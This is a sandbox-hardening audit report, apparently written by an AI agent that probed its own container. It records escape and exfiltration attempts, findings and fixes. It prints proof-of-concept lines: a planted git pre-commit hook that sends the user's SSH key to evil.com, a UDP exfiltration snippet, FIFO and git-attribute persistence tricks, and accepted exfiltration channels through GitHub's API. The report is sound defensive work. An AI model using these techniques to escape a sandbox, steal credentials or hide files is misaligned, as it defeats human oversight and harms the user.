# Audit Round 19 — Offensive Container Escape & Data Exfiltration Probing

**Date:** 2026-02-19
**Auditor:** Claude (Opus 4.6), running inside the sandbox
**Scope:** Container escape, data exfiltration, sync-back abuse, mount escape, exotic bypass vectors
**Method:** Active probing from inside the running container + code review of all security-relevant files

## Executive Summary

The sandbox demonstrates **strong defense-in-depth**. No container escape was achieved. The kernel-enforced controls (seccomp, capabilities, read-only rootfs, ld.so.preload) are solid. However, active probing revealed **3 medium-severity gaps** and **4 low-severity issues** that can be hardened. The most impactful finding is a sync-back bypass via FIFO special files that could enable host-side DoS or data injection.

## Findings Summary

| ID | Severity | Finding | Exploitable | Fix Complexity | Status |
|----|----------|---------|-------------|----------------|--------|
| R19-01 | **MEDIUM** | FIFO files bypass `rsync --no-links` in sync-back | Yes | Trivial | **Implemented** |
| R19-02 | **MEDIUM** | Host network firewall rule allows all protocols (UDP/SCTP/raw) | Conditional | Trivial | **Implemented** |
| R19-03 | **MEDIUM** | `.git/hooks/` directory writable — hooks persist to host | Yes | Easy | **Implemented** |
| R19-04 | LOW | `.git/info/attributes` not protected — filter driver persistence | Yes (host-only) | Easy | **Implemented** |
| R19-05 | LOW | `.git/info/exclude` not monitored — can hide malicious files from `git diff` | Yes | Easy | **Implemented** |
| R19-06 | LOW | Tunnel interfaces present (tunl0, sit0, ip6tnl0) | No | Trivial | **Implemented** |
| R19-07 | LOW | SCTP socket creation allowed | No | Trivial | **Implemented** |

### Previously Accepted Risks (Confirmed Still Present)

| Risk | Status | Notes |
|------|--------|-------|
| GitHub API POST exfiltration (unauthenticated) | **Accepted** | ~3 MB/hr via `/markdown` endpoint; inherent to GitHub API access |
| Anthropic API POST exfiltration | **Accepted** | Request reaches server but no read-back mechanism |
| GitHub token extractable via credential cache socket | **Accepted** | Same-UID limitation; mitigated by fine-grained PATs |
| Workspace fully writable (file planting) | **Accepted** | Post-exit audit detects 52+ suspect file patterns |
| Interpreter-based noexec bypass | **Accepted** | Fundamental OS behavior; firewall limits impact |

---

## Detailed Findings

### R19-01: FIFO Files Bypass `rsync --no-links` in Sync-Back [MEDIUM]

**Location:** `container/entrypoint.sh:145` (entrypoint rsync), `run-claude.sh:709` (host-side rsync)

**Description:** The sync-back mechanism uses `rsync -a --no-links` to skip symlinks when copying session data from the container tmpfs to the host staging directory. However, `--no-links` only skips symbolic links. It does NOT skip FIFO (named pipe) special files. A compromised session can create FIFOs in `~/.claude/` on the tmpfs, and they will be copied to the host staging directory.

**Proof of concept:**
```bash
# Inside container as claude user:
mkfifo /home/claude/.claude/evil-pipe
# On container exit, rsync copies this FIFO to the host staging directory
```

**Impact:**
1. **Host-side DoS:** If any host-side processing (rsync itself, or subsequent file operations) attempts to `open()` or `read()` the FIFO, it blocks indefinitely waiting for a writer, hanging the post-exit cleanup.
2. **Data injection:** If the container is still running when the host-side rsync reads the FIFO, the container process could feed arbitrary data through it, potentially injecting content into host files.

**Root cause:** `rsync --no-links` is insufficient. FIFOs, device nodes, and other special files are not filtered.

**Fix:**
```diff
# entrypoint.sh line 145:
-        rsync -a --no-links \
+        rsync -a --no-links --no-specials --no-devices \

# run-claude.sh line 709:
-    rsync -a --no-links \
+    rsync -a --no-links --no-specials --no-devices \
```

`--no-specials` skips FIFOs, sockets, and other special files. `--no-devices` skips device files. Together they ensure only regular files and directories are synced.

---

### R19-02: Host Network Firewall Rule Allows All Protocols [MEDIUM]

**Location:** `container/init-firewall.sh:110`

**Description:** The host network allow rule permits ALL protocols to the host subnet:
```bash
iptables -A OUTPUT -d "$HOST_NETWORK" -j ACCEPT
```

While dangerous TCP ports (22, 2375, 2376) are blocked by earlier rules, the blanket ACCEPT allows UDP, SCTP, and raw IP packets to any port on the host subnet.

**Proof of concept:**
```python
import socket
# UDP to host on any port - packets are sent without error
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"exfiltrated_data", ("192.168.215.1", 4444))
# If any UDP service listens on the host, data is received
```

**Impact:** If any UDP service runs on the host (DNS forwarder, DHCP, mDNS, custom services), data can be exfiltrated. The practical risk depends on host configuration, but the rule is broader than necessary.

**Root cause:** The rule uses no `-p` (protocol) restriction. It was designed to allow Docker Desktop MCP proxy traffic (TCP), but permits all protocols.

**Fix:**
```diff
# init-firewall.sh line 110:
-iptables -A OUTPUT -d "$HOST_NETWORK" -j ACCEPT
+iptables -A OUTPUT -p tcp -d "$HOST_NETWORK" -j ACCEPT
```

If the inbound rule on line 109 also needs restriction:
```diff
-iptables -A INPUT -s "$HOST_NETWORK" -j ACCEPT
+iptables -A INPUT -p tcp -s "$HOST_NETWORK" -j ACCEPT
+iptables -A INPUT -p udp -s "$HOST_NETWORK" --sport 53 -j ACCEPT  # DNS responses
```

**Note:** Verify that MCP proxy communication and Docker Desktop DNS responses only use TCP before restricting INPUT. The `ESTABLISHED,RELATED` rule (if present before this rule in the chain) may already handle return traffic.

---

### R19-03: `.git/hooks/` Directory Writable — Hooks Persist to Host [MEDIUM]

**Location:** `container/entrypoint.sh` (no lockdown of `.git/hooks/` directory)

**Description:** While `.git/config` is locked to `root:root 444` after sanitization (R11-01/R11-07 fix), the `.git/hooks/` directory remains writable by the claude user. A compromised session can:

1. Create new hook files (e.g., `pre-commit`, `post-checkout`, `post-merge`)
2. Modify existing `.sample` hook files (rename to active hooks)

Inside the container, hooks are neutralized by `core.hooksPath=/dev/null`. However, hook files persist to the host via the workspace bind mount. On the host, the user's native git does NOT have `core.hooksPath=/dev/null`, so planted hooks execute on the next `git commit`, `git checkout`, etc.

**Proof of concept:**
```bash
# Inside container:
cat > /workspace/.git/hooks/pre-commit << 'EOF'
#!/bin/sh
curl -d "$(cat ~/.ssh/id_rsa 2>/dev/null || echo none)" https://evil.com/exfil
exit 0  # Don't block the commit
EOF
chmod +x /workspace/.git/hooks/pre-commit
# Next host-side `git commit` executes this hook
```

**Mitigation already in place:** The post-exit audit (run-claude.sh:810-848) detects new/modified non-sample hooks and prompts the user interactively. Default action is removal. This is effective but relies on the user paying attention.

**Root cause:** The hooks directory is not locked down inside the container. The post-exit audit is reactive (detect-and-prompt) rather than preventive.

**Fix:**
```bash
# In entrypoint.sh, after git config sanitization (around line 373):
# Lock .git/hooks directory to prevent hook planting
if [ -d /workspace/.git/hooks ]; then
    chown root:root /workspace/.git/hooks
    chmod 555 /workspace/.git/hooks
fi
```

**Caveat:** This may break legitimate use cases where Claude Code needs to create hooks. If that's needed, consider a more targeted approach: lock the directory but allow specific hook names. The `core.hooksPath=/dev/null` already prevents hook execution inside the container, so there's no functional reason for Claude to write hooks. However, virtiofs on macOS may ignore POSIX permission changes, making this fix ineffective on OrbStack. In that case, the post-exit audit remains the primary defense.

---

### R19-04: `.git/info/attributes` Not Protected — Filter Driver Persistence [LOW]

**Location:** `.git/info/attributes` (not in entrypoint sanitization or post-exit suspect file list)

**Description:** A compromised session can write to `.git/info/attributes` to define filter drivers:
```bash
echo '*.py filter=exfil' > /workspace/.git/info/attributes
```

Inside the container, the `filter` section is stripped from `.git/config` and `.git/config` is locked to root:root 444, so filter drivers cannot execute. However, `.git/info/attributes` persists to the host. If a future host-side session (or native git) has a matching filter config, the attributes file activates it.

**This is a persistence vector** — the attributes file defines WHAT files trigger filters, while the config defines WHAT the filters DO. Planting the attributes file is step 1 of a two-step attack (the config would need to be injected separately, perhaps via a different vector or social engineering).

**Root cause:** `.git/info/attributes` is not in the suspect files list (SUSPECT_FILES array in run-claude.sh:438-451) and not in the entrypoint sanitization.

**Fix:**
1. Add `.git/info/attributes` to the SUSPECT_FILES array in `run-claude.sh`:
```diff
 SUSPECT_FILES=(
     CLAUDE.md Justfile Taskfile.yml .envrc .vscode/settings.json .vscode/tasks.json
     Makefile .gitattributes .gitmodules .github/workflows package.json .npmrc .yarnrc.yml
+    .git/info/attributes .git/info/exclude
```

2. Optionally, lock `.git/info/` to read-only in the entrypoint (same virtiofs caveat as R19-03).

---

### R19-05: `.git/info/exclude` Not Monitored — Can Hide Files from `git diff` [LOW]

**Location:** `.git/info/exclude` (not in post-exit suspect file monitoring)

**Description:** A compromised session can modify `.git/info/exclude` to hide malicious files from `git diff` and `git status`, making them invisible during post-exit review:
```bash
# Hide all planted files from git diff
echo '.envrc' >> /workspace/.git/info/exclude
echo '.github/workflows/*' >> /workspace/.git/info/exclude
```

This was identified in AUDIT-ROUND-10 (L12) but categorized as marginal. The file is still not monitored.

**Root cause:** `.git/info/exclude` is not in the SUSPECT_FILES array.

**Fix:** Add to SUSPECT_FILES (same diff as R19-04 above — both `.git/info/attributes` and `.git/info/exclude`).

---

### R19-06: Tunnel Interfaces Present (tunl0, sit0, ip6tnl0) [LOW]

**Location:** Container network namespace (kernel default)

**Description:** Three tunnel interfaces exist in the container's network namespace:
- `tunl0` — IP-in-IP tunnel
- `sit0` — IPv6-in-IPv4 tunnel
- `ip6tnl0` — IPv6 tunnel

All interfaces are DOWN and cannot be activated (requires NET_ADMIN, which is dropped after init). No practical exploit is possible.

**Root cause:** These are Linux kernel defaults created when the tunnel kernel modules are loaded. They exist in every network namespace.

**Fix:** Delete them during firewall init (defense-in-depth):
```bash
# In init-firewall.sh, after firewall setup:
ip link delete tunl0 2>/dev/null || true
ip link delete sit0 2>/dev/null || true
ip link delete ip6tnl0 2>/dev/null || true
```

---

### R19-07: SCTP Socket Creation Allowed [LOW]

**Location:** `config/seccomp-profile.json` (socket syscall not restricted by protocol)

**Description:** The claude user can create SCTP sockets:
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132)  # IPPROTO_SCTP
```

Connection attempts time out (blocked by iptables default DROP), so no data exfiltration is possible. However, SCTP is unnecessary for Claude Code operation.

**Root cause:** The seccomp profile allows `socket()` for AF_INET with any protocol. Only AF_VSOCK (40) is specifically blocked.

**Fix:** This is defense-in-depth only. The iptables rules already block SCTP traffic. If desired, add SCTP blocking to iptables:
```bash
# In init-firewall.sh:
iptables -A OUTPUT -p sctp -j DROP
```

---

## Security Controls Verified Working (22 Controls Tested)

| # | Control | Test | Result |
|---|---------|------|--------|
| 1 | Read-only rootfs | Write to /, /usr, /bin, /etc | **PASS** — "Read-only file system" |
| 2 | Capability drop (post-init) | Check CapBnd after setpriv | **PASS** — Empty bounding set |
| 3 | Seccomp filter | ptrace, io_uring, bpf, unshare via ctypes | **PASS** — EPERM/ENOSYS |
| 4 | no-new-privileges | Check NoNewPrivs flag | **PASS** — Set to 1 |
| 5 | PID namespace isolation | /proc/1 access | **PASS** — tini as PID 1, environ blocked |
| 6 | /proc/pid/mem protection | Open /proc/1/mem via Python, Node | **PASS** — EACCES (nodump.so) |
| 7 | nodump.so loading | Check /proc/self/maps for nodump.so | **PASS** — Loaded in every process |
| 8 | git-guard.so enforcement | git push, remote add, config dangerous keys | **PASS** — All blocked |
| 9 | git-guard.so env bypass | Python: set GIT_CONFIG_COUNT=0, call wrapped-git | **PASS** — Guard re-forces config |
| 10 | ld.so.preload immutability | Write to /etc/ld.so.preload | **PASS** — Read-only filesystem |
| 11 | .git/config lock | Write to /workspace/.git/config | **PASS** — root:root 444 |
| 12 | DNS blocking (claude user) | dig, nslookup, python socket.getaddrinfo | **PASS** — All blocked |
| 13 | DNS over HTTPS | curl to 1.1.1.1, 8.8.8.8 | **PASS** — Not in allowlist |
| 14 | SSH outbound blocking | ssh to github.com, example.com | **PASS** — Connection refused/timeout |
| 15 | Cloud metadata blocking | curl to 169.254.169.254 | **PASS** — Connection timeout |
| 16 | Docker API blocking | curl to host:2375, host:2376 | **PASS** — Connection timeout |
| 17 | IPv6 disabled | ip -6 addr, ping6 | **PASS** — Disabled via sysctl |
| 18 | VSOCK blocked | socket(AF_VSOCK) | **PASS** — EPERM (seccomp) |
| 19 | Device creation blocked | mknod | **PASS** — EPERM |
| 20 | Namespace tools removed | which nsenter, unshare, chroot, pivot_root | **PASS** — Not found |
| 21 | Cgroup read-only | Write to cgroup v2 controllers | **PASS** — Read-only filesystem |
| 22 | noexec on tmpfs | chmod +x && execute on /tmp | **PASS** — Permission denied |

---

## Attack Chains Tested (All Failed)

### Chain 1: Container Escape via Namespace
```
unshare(CLONE_NEWUSER) → EPERM (seccomp blocks CLONE_NEW* flags)
                       → No CAP_SYS_ADMIN in bounding set
```

### Chain 2: Container Escape via Cgroup
```
Write release_agent → read-only cgroup v2 mount
                    → No notify_on_release in cgroupv2
```

### Chain 3: /proc/pid/mem Credential Theft
```
Open /proc/<any>/mem → EACCES (nodump.so sets dumpable=0)
                     → ptrace blocked by seccomp
```

### Chain 4: Git Config Manipulation → Code Execution
```
Edit .git/config → root:root 444 (permission denied)
GIT_CONFIG_COUNT override → git-guard.so re-forces its own values
Direct wrapped-git call → git-guard.so loaded via ld.so.preload (read-only rootfs)
```

### Chain 5: DNS Tunneling Exfiltration
```
DNS query as claude → iptables DROP (all DNS blocked for UID 501)
DNS over HTTPS → 1.1.1.1/8.8.8.8 not in allowlist
DoH via allowed host → No DNS resolver on api.github.com
```

### Chain 6: Symlink Escape via Sync-Back
```
Create symlink → rsync --no-links skips all symlinks
Create relative symlink → also skipped by --no-links
Create hardlink → EXDEV (cross-device link, tmpfs → virtiofs)
```

### Chain 7: Domain Fronting
```
curl --resolve evil.com:443:<github-ip> https://evil.com → TLS certificate mismatch → connection refused
```

---

## Recommendations (Priority Order)

### Priority 1: Fix R19-01 (FIFO sync-back bypass) — Trivial
Add `--no-specials --no-devices` to both rsync commands. This closes a real exploit path (DoS or data injection via named pipes).

### Priority 2: Fix R19-02 (host network protocol restriction) — Trivial
Restrict the host network OUTPUT rule to TCP only. This closes an unnecessary protocol surface to the host subnet.

### Priority 3: Fix R19-03 (lock .git/hooks/) — Easy, with Caveat
Lock the hooks directory to root:root 555 in the entrypoint. Note the virtiofs caveat — test whether POSIX changes take effect on OrbStack. If not, the post-exit interactive hook review remains the primary defense (already implemented and effective).

### Priority 4: Fix R19-04 and R19-05 (monitor .git/info/*) — Easy
Add `.git/info/attributes` and `.git/info/exclude` to the SUSPECT_FILES array. This extends the existing post-exit audit to cover these persistence/evasion vectors.

### Priority 5: Fix R19-06 (remove tunnel interfaces) — Trivial, Defense-in-Depth
Delete unused tunnel interfaces in init-firewall.sh. No functional impact; reduces theoretical attack surface.

### Priority 6: Fix R19-07 (block SCTP) — Trivial, Defense-in-Depth
Add SCTP DROP rule to iptables. Already blocked by default DROP policy, so this is belt-and-suspenders.
